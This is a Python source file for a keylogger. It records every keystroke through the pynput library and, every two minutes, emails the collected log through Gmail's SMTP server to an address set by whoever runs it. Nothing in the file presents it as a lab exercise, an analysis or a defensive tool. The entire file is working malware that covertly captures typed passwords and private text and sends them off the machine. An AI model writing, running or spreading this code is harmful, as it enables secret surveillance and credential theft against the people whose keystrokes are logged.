import smtplib
import threading
from pynput import keyboard
from email.message import EmailMessage

#replace placeholders
EMAIL_ADDRESS = "youremail@gmail.com"
EMAIL_PASSWORD = "your_app_password"
SEND_INTERVAL = 120  # in seconds

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f"[{key.name}]"

def send_email():
    global log
    if log:
        msg = EmailMessage()
        msg.set_content(log)
        msg["Subject"] = "Keylogger Log"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS

        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                smtp.send_message(msg)
            print("[+] Email sent")
        except Exception as e:
            print(f"[!] Failed to send email: {e}")

        log = ""

    timer = threading.Timer(SEND_INTERVAL, send_email)
    timer.daemon = True
    timer.start()

# === Start Keylogger ===
listener = keyboard.Listener(on_press=on_press)
listener.start()
send_email()
listener.join()


